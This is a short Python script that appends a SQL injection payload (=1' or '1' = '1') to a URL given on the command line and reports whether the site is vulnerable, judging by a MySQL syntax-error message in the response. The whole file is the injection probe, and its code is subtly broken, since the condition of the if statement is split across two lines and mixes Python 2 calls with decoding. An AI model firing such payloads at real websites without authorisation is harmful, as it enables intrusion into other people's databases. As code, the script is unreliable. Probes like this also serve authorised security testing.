import sys
import urllib

url = sys.argv[1]

payload = "=1\' or \'1\' = \'1\'"
f = urllib.urlopen(url + payload)
body = f.read()
fullbody = body.decode('utf-8')

if "Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1"
in fullbody:
  print "The website is vulnerable"
else:
  print "The website is not vulnerable"
